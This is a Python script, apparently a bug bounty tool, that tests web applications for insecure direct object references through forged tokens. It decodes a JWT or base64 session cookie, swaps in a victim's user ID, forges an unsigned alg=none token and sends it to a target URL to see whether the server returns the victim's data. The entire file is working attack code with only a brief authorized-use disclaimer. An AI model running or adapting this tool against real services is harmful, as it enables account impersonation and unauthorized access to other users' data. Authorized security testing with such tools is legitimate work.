#!/usr/bin/env python3
"""
JWT / Cookie IDOR Tester
========================
Tests IDOR where the user ID is embedded inside a JWT payload or
a base64-encoded cookie — not in the URL parameter.

Workflow:
  1. Decode attacker's JWT/cookie → find user_id field
  2. Replace user_id with victim's user_id
  3. Re-encode and send the modified token
  4. If server accepts it → IDOR confirmed

Usage: python3 jwt_idor_tester.py --help

⚠️  For authorized testing only. Always stay within program scope.
"""

import argparse
import base64
import json
import requests
import hmac
import hashlib
from datetime import datetime

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════╗
║       JWT / Cookie IDOR Tester v1.0      ║
║   For authorized bug bounty testing only ║
╚══════════════════════════════════════════╝{RESET}
""")

# ─── JWT Helpers ──────────────────────────────────────────────────────────────

def b64_decode(data: str) -> bytes:
    """Base64url decode with padding fix."""
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)

def b64_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Split and decode a JWT into header, payload, signature."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a valid JWT (must have 3 parts)")
    header  = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    sig     = parts[2]
    return header, payload, sig

def forge_jwt_none(header: dict, payload: dict) -> str:
    """Forge a JWT with alg=none (no signature check bypass)."""
    header["alg"] = "none"
    h = b64_encode(json.dumps(header, separators=(",",":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",",":")).encode())
    return f"{h}.{p}."

def modify_jwt_payload(token: str, field: str, new_value) -> str:
    """Replace a field in JWT payload and return forged none-alg token."""
    header, payload, _ = decode_jwt(token)
    print(f"\n{BOLD}[*] Original JWT payload:{RESET}")
    print(json.dumps(payload, indent=2))
    payload[field] = new_value
    print(f"\n{BOLD}[*] Modified JWT payload (field '{field}' → {new_value}):{RESET}")
    print(json.dumps(payload, indent=2))
    return forge_jwt_none(header, payload)

# ─── Cookie Helpers ───────────────────────────────────────────────────────────

def decode_b64_cookie(cookie_val: str) -> dict:
    try:
        decoded = b64_decode(cookie_val)
        return json.loads(decoded)
    except Exception as e:
        print(f"{RED}[!] Could not decode cookie as JSON: {e}{RESET}")
        return {}

def encode_b64_cookie(data: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(data, separators=(",",":")).encode()).rstrip(b"=").decode()

# ─── Main Test ────────────────────────────────────────────────────────────────

def run(args):
    banner()

    print(f"{BOLD}[*] Target URL  : {args.url}{RESET}")
    print(f"{BOLD}[*] Mode        : {args.mode}{RESET}")
    print(f"{BOLD}[*] Field       : {args.field}{RESET}")
    print(f"{BOLD}[*] Victim ID   : {args.victim_id}{RESET}\n")

    modified_token = None

    if args.mode == "jwt":
        try:
            modified_token = modify_jwt_payload(args.token, args.field, args.victim_id)
            print(f"\n{BOLD}[*] Forged JWT (alg=none):{RESET}")
            print(f"  {YELLOW}{modified_token[:80]}...{RESET}\n")
        except Exception as e:
            print(f"{RED}[!] JWT error: {e}{RESET}")
            return

    elif args.mode == "cookie":
        data = decode_b64_cookie(args.token)
        if not data:
            return
        print(f"\n{BOLD}[*] Original cookie payload:{RESET}")
        print(json.dumps(data, indent=2))
        data[args.field] = args.victim_id
        modified_token = encode_b64_cookie(data)
        print(f"\n{BOLD}[*] Modified cookie payload:{RESET}")
        print(json.dumps(data, indent=2))

    # Send the modified request
    headers = {"User-Agent": "JWT-IDOR/1.0", "Accept": "application/json"}
    if args.mode == "jwt":
        headers["Authorization"] = f"Bearer {modified_token}"
    else:
        headers["Cookie"] = f"{args.cookie_name}={modified_token}"

    try:
        resp = requests.get(args.url, headers=headers, timeout=10)
        print(f"\n{BOLD}[*] Response: Status={resp.status_code} | Len={len(resp.text)}{RESET}")
        if resp.status_code == 200:
            print(f"{GREEN}[!] POSSIBLE IDOR — Server accepted the modified token!{RESET}")
        elif resp.status_code == 401:
            print(f"{RED}[-] 401 Unauthorized — Signature validation is enforced.{RESET}")
        elif resp.status_code == 403:
            print(f"{RED}[-] 403 Forbidden — Authorization check blocked access.{RESET}")
        else:
            print(f"{YELLOW}[?] Unexpected status — investigate manually.{RESET}")

        print(f"\n{BOLD}Response body (first 500 chars):{RESET}")
        print(resp.text[:500])

        if args.output:
            with open(args.output, "w") as f:
                json.dump({
                    "timestamp": datetime.now().isoformat(),
                    "url": args.url,
                    "mode": args.mode,
                    "forged_token": modified_token,
                    "status": resp.status_code,
                    "response": resp.text[:1000]
                }, f, indent=2)
            print(f"\n{GREEN}[+] Report saved to: {args.output}{RESET}")

    except Exception as e:
        print(f"{RED}[!] Request failed: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="JWT/Cookie IDOR Tester — authorized testing only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url",         required=True, help="Target endpoint URL")
    parser.add_argument("--mode",        required=True, choices=["jwt","cookie"], help="Mode: jwt or cookie")
    parser.add_argument("--token",       required=True, help="Your (attacker) JWT or base64 cookie value")
    parser.add_argument("--field",       required=True, help="Field to replace in payload (e.g. user_id, sub, uid)")
    parser.add_argument("--victim-id",   required=True, help="Victim's ID to inject")
    parser.add_argument("--cookie-name", default="session", help="Cookie name (for cookie mode, default: session)")
    parser.add_argument("--output",      default="jwt_idor_report.json", help="Output file")
    args = parser.parse_args()
    run(args)

if __name__ == "__main__":
    main()
